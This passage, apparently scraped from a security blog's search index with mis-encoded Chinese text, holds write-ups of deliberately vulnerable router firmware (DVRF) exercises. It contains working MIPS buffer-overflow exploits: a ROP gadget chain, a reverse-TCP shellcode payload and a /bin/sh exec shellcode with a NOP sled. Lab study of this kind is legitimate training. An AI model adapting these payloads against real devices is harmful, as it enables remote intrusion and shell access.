5.å¯»æ‰¾gadgetå°†å¯„å­˜å™¨å€¼èµ‹å€¼åˆ°è·³è½¬è¯­å¥å¯„å­˜å™¨ä¸Šè·³è½¬åˆ°æ ˆä¸Šçš„æ­£ç¡®ä½ç½®æ‰§è¡Œshellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gadgetsæŸ¥æ‰¾&#34;&gt;gadgetsæŸ¥æ‰¾ï¼š&lt;/h4&gt;
&lt;p&gt;é¦–å…ˆæ˜¯æ‰¾ç»™&lt;code&gt;$a0&lt;/code&gt;å¯„å­˜å™¨èµ‹å€¼ä¸º1çš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Found 45 matching gadgets
Python&amp;gt;mipsrop.find(&amp;quot;li $a0,1&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x00018AA8  |  li $a0,1                                            |  jalr  $s3                             |
|  0x0002FB10  |  li $a0,1                                            |  jalr  $s1                             |
|  0x00012D3C  |  li $a0,1                                            |  jr    0x20+var_s0($sp)                |
|  0x00022420  |  li $a0,1                                            |  jr    0x18+var_s8($sp)                |
|  0x0002A9C8  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
----------------------------------------------------------------------------------------------------------------
Found 5 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨åç§»ä¸º0x2FB10çš„gadget0&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0002FB10 01 00 04 24                   li      $a0, 1
.text:0002FB14 21 C8 20 02                   move    $t9, $s1
.text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿå¯¹&lt;code&gt;$s1&lt;/code&gt;èµ‹å€¼çš„gadget1ï¼ŒæŸ¥æ‰¾&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;lw $s1&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æ‰¾åˆ°0x7730å¤„çš„gadget1ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜å¯ä»¥æ§åˆ¶ä¸€äº›å…¶å®ƒå¯„å­˜å™¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
.text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
.text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00007744 08 00 E0 03                   jr      $ra
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ°æ­¤å¤„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œå®Œ&lt;code&gt;sleep&lt;/code&gt;åç»§ç»­æ‰§è¡Œshellcodeçš„è¯ï¼Œéœ€è¦ä¸€ä¸ªåˆ©ç”¨&lt;code&gt;$ra&lt;/code&gt;é™¤å¤–å¯„å­˜å™¨è·³è½¬çš„å¹¶ä¸”å¯ä»¥å†™&lt;code&gt;$ra&lt;/code&gt;çš„gadget2ï¼Œç»§ç»­æŸ¥æ‰¾&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E03C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0001F07C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0001F2C0  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0001FBCC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x000201F4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00020F1C  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00020FE4  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021200  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021C34  |  move $t9,$s3                                        |  jr    $s3                             |
|  0x00022E94  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0002313C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x000267B4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00033AF4  |  move $t9,$s0                                        |  jr    $s0                             |
----------------------------------------------------------------------------------------------------------------
Found 13 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨åç§»0x20F1Cå¤„çš„gadget2ï¼Œä¸ä»…èƒ½å¤Ÿç»™&lt;code&gt;$ra&lt;/code&gt;å¯„å­˜å™¨èµ‹å€¼ï¼Œä¹Ÿèƒ½ç”¨gadget1æ§åˆ¶&lt;code&gt;$s2&lt;/code&gt;å€¼è¿›è¡Œè·³è½¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00020F1C 21 C8 40 02                   move    $t9, $s2
.text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
.text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00020F30 08 00 20 03                   jr      $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code&gt;jr $t9&lt;/code&gt;è·³è½¬åˆ°&lt;code&gt;sleep&lt;/code&gt;å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡gadget2æ§åˆ¶&lt;code&gt;$ra&lt;/code&gt;ä¸ºshellcodeçš„æ ˆåœ°å€å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code&gt;mipsrop.stackfinder()&lt;/code&gt;æŸ¥æ‰¾ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯æŸ¥æ‰¾å°†æ ˆåœ°å€å­˜å…¥å¯„å­˜å™¨çš„gadgetï¼Œæ‰¾åˆ°åç§»0x16DD0å¤„çš„gadget3&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
.text:00016DD4 21 C8 00 02                   move    $t9, $s0
.text:00016DD8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤å¤„é€šè¿‡æ§åˆ¶&lt;code&gt;$s0&lt;/code&gt;è¿›ä¸€æ­¥æ§åˆ¶&lt;code&gt;$t9&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;$s0&lt;/code&gt;æˆ‘ä»¬åœ¨gadget2ä¸­å³å¯æ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è·³è½¬åˆ°shellcodeæ‰€åœ¨æ ˆåœ°å€ä¸Šï¼Œåˆ™éœ€è¦å°†&lt;code&gt;$a0&lt;/code&gt;å€¼å­˜å…¥&lt;code&gt;$t9&lt;/code&gt;ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ§åˆ¶&lt;code&gt;$s0&lt;/code&gt;çš„å€¼ä¸ºä¸‹ä¸€ä¸ªgadget4ï¼ŒæŸ¥æ‰¾&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;move $t9,$a0&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000214A0  |  move $t9,$a0                                        |  jalr  $a0                             |
----------------------------------------------------------------------------------------------------------------
Found 1 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åç§»0x214A0å¤„çš„gadget4æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:000214A0 21 C8 80 00                   move    $t9, $a0
.text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
.text:000214A8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬æ¢³ç†ä¸€éæ€è·¯ï¼Œå¯ä»¥å¾—å‡ºä¸‹é¢çš„å¤§è‡´æµç¨‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget1-&amp;gt;gadget0-gadget2-&amp;gt;sleep()-&amp;gt;gadget3-&amp;gt;gadget4-&amp;gt;shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æ ¹æ®è¿™ä¸ªæµç¨‹å¤§è‡´å†™å‡ºpayloadç„¶ågdbè°ƒè¯•&lt;br&gt;
åœ¨æœ¬æœºä¸Šè¿è¡Œçš„æ—¶å€™ï¼Œå‘ç°åœ¨gadget2ä¸Šå¡«å……paddingçš„æ—¶å€™ï¼Œéœ€è¦é¢å¤–å¡«å……0x4å­—èŠ‚çš„æ•°æ®æ‰èƒ½æ­£å¸¸ç»™å¯¹åº”å¯„å­˜å™¨èµ‹å€¼&lt;br&gt;
msfvenomç”Ÿæˆshellcodeçš„æ—¶å€™æ³¨æ„æŒ‡å®š&lt;code&gt;LHOST&lt;/code&gt;å’Œ&lt;code&gt;LPORT&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;exp:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

libc_base=0x3fecd000
sleep_func=0x2f2b0+libc_base


# msfvenom -p linux/mipsle/shell_reverse_tcp --arch mipsle --platform linux -f py --bad-chars &#39;\x00&#39;
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&amp;quot;
buf += b&amp;quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&amp;quot;
buf += b&amp;quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&amp;quot;
buf += b&amp;quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&amp;quot;
buf += b&amp;quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&amp;quot;
buf += b&amp;quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&amp;quot;
buf += b&amp;quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&amp;quot;
buf += b&amp;quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x01\x01\x01&amp;quot;
shellcode=buf


gadget0=0x2FB10+libc_base
# .text:0002FB10 01 00 04 24                   li      $a0, 1
# .text:0002FB14 21 C8 20 02                   move    $t9, $s1
# .text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818


gadget1=0x7730+libc_base
# .text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
# .text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
# .text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00007744 08 00 E0 03                   jr      $ra


gadget2=0x20F1C+libc_base
# .text:00020F1C 21 C8 40 02                   move    $t9, $s2
# .text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
# .text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00020F30 08 00 20 03                   jr      $t9


gadget3=0x16DD0+libc_base
# .text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
# .text:00016DD4 21 C8 00 02                   move    $t9, $s0
# .text:00016DD8 09 F8 20 03                   jalr    $t9


gadget4=0x214A0+libc_base
# .text:000214A0 21 C8 80 00                   move    $t9, $a0
# .text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
# .text:000214A8 09 F8 20 03                   jalr    $t9


#stack for gadget1
payload=b&amp;quot;a&amp;quot;*51 #padding
payload+=p32(gadget1) # $ra0-&amp;gt;gadget1
payload+=b&amp;quot;a&amp;quot;*0x18 #padding
payload+=b&amp;quot;aaaa&amp;quot; # $s0
payload+=p32(gadget2) # $s1-&amp;gt;gadget2
payload+=p32(sleep_func) # $s2-&amp;gt;sleep_func
payload+=b&amp;quot;aaaa&amp;quot; #padding
payload+=p32(gadget0) # $ra1-&amp;gt;gadget0


#stack for gadget2
payload+=b&amp;quot;a&amp;quot;*0x1c #padding
payload+=p32(gadget4) # $s0-&amp;gt;gadget
payload+=b&amp;quot;aaaa&amp;quot;*2 #padding
payload+=p32(gadget3) # $ra2-&amp;gt;gadget3

# gadget1-&amp;gt;gadget0-&amp;gt;gadget2-&amp;gt;sleep(1)-&amp;gt;gadget3-&amp;gt;gadget4

#stack for shellcode
payload+=b&amp;quot;a&amp;quot;*0x18
payload+=shellcode

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF socket_bof</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oIVkgnDGh/"" data-c="
          &lt;p&gt;ä¸stack_bof_01ç±»ä¼¼ï¼Œä¸è¿‡å°‘äº†åé—¨å‡½æ•°ï¼Œmipsæ¶æ„å…³é—­NXä¿æŠ¤ï¼Œæ‰€ä»¥æ­¤é¢˜æ‰“shellcodeå³å¯ï¼Œå¯ä»¥æå‰è°ƒè¯•å‡ºè¿”å›çš„æ ˆä¸Šåœ°å€ç„¶åéƒ¨ç½²shellcodeï¼Œæœ€åè¦†ç›–&lt;code&gt;$ra&lt;/code&gt;ä¸ºè¯¥åœ°å€å³å¯&lt;br&gt;
éƒ¨ç½²shellcodeæ—¶å¯ä»¥åœ¨shellcodeå‰é¢åŠ ä¸Šnop sledå¢å¼ºæ³›ç”¨æ€§&lt;br&gt;
jeb2ä¸Šé¢ç»™çš„nop sledæ˜¯è¿™ä¸ª&lt;br&gt;
&lt;code&gt;# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes): &amp;quot;\x26\x40\x08\x01&amp;quot;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;$t0&lt;/code&gt;å±äºä¸´æ—¶å¯„å­˜å™¨ï¼Œnopçš„åŸåˆ™æ˜¯å¯¹åç»­æ‰§è¡Œshellcodeä¸å½±å“ï¼Œå¦‚æœç”¨msfvenomç”Ÿæˆshellcodeå¯ä»¥èµŒä¸€æ‰‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä¸Šé¢è„šæœ¬ç”Ÿæˆpadding&lt;br&gt;
ä½¿ç”¨bashè„šæœ¬å¯åŠ¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./stack_bof_02 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gdb-multiarchè¿æ¥ä¸Šä¹‹åæµ‹ç®—åç§»é‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*PC   0x66616163 (&#39;caaf&#39;)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / mips / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Invalid address 0x66616163










â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ fp sp 0x407ffd08 â—‚â€” 0x66616164 (&#39;daaf&#39;)
01:0004â”‚       0x407ffd0c â—‚â€” 0x66616165 (&#39;eaaf&#39;)
02:0008â”‚       0x407ffd10 â—‚â€” 0x66616166 (&#39;faaf&#39;)
03:000câ”‚       0x407ffd14 â—‚â€” 0x66616167 (&#39;gaaf&#39;)
04:0010â”‚       0x407ffd18 â—‚â€” 0x66616168 (&#39;haaf&#39;)
05:0014â”‚       0x407ffd1c â—‚â€” 0x66616169 (&#39;iaaf&#39;)
06:0018â”‚       0x407ffd20 â—‚â€” 0x6661616a (&#39;jaaf&#39;)
07:001câ”‚       0x407ffd24 â—‚â€” 0x6661616b (&#39;kaaf&#39;)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0 0x66616163
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&amp;gt; cyclic -l 0x66616163
Finding cyclic pattern of 4 bytes: b&#39;caaf&#39; (hex: 0x63616166)
Found at offset 508
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æµ‹å‡ºæ¥åç§»ä¸º508&lt;br&gt;
è¿™é“é¢˜msfvenomç”Ÿæˆçš„shellcodeä¸å¤ªç¨³ï¼Œå¯ä»¥å¤šç”Ÿæˆå‡ æ¬¡è¯•è¯•ï¼Œä¹Ÿå¯ä»¥ç”¨shell-stromä¸Šæœ‰çš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;â”Œâ”€[fk@fk]â”€[~]
â””â”€â”€â•¼ $msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &amp;quot;\x00&amp;quot;
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=51, char=0x00)
Attempting to encode payload with 1 iterations of mipsle/byte_xori
mipsle/byte_xori succeeded with size 156 (iteration=0)
mipsle/byte_xori chosen with final size 156
Payload size: 156 bytes
Final size of py file: 778 bytes
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ³¨æ„expé‡Œé¢&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

# libc_addr=0x3fecd000

payload=b&amp;quot;&amp;quot;

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
for i in range(30):
    payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;


payload +=buf
stack_addr=0x407ffc08
payload+=b&amp;quot;a&amp;quot;*(508-len(payload))+p32(stack_addr)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1692632215340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">DVRF stack_bof_02</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9lLK_Patw/"" data-c="
          &lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;æå–å›ºä»¶å&lt;br&gt;
ä½¿ç”¨idaæŸ¥çœ‹ï¼Œå‘ç°ç¨‹åºä»å‘½ä»¤è¡Œå‚æ•°ä¸­ä¼ é€’&lt;code&gt;strcpy&lt;/code&gt;çš„æ•°æ®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[200]; // [sp+18h] [+18h] BYREF

  if ( argc &amp;lt; 2 )
  {
    puts(&amp;quot;Usage: stack_bof_01 &amp;lt;argument&amp;gt;\r\n-By b1ack0wl\r&amp;quot;);
    exit(1);
  }
  puts(&amp;quot;Welcome to the first BoF exercise!\r\n\r&amp;quot;);
  strcpy(v4, argv[1]);
  printf(&amp;quot;You entered %s \r\n&amp;quot;, v4);
  return 65;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡&lt;code&gt;cyclic&lt;/code&gt;ç”Ÿæˆ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

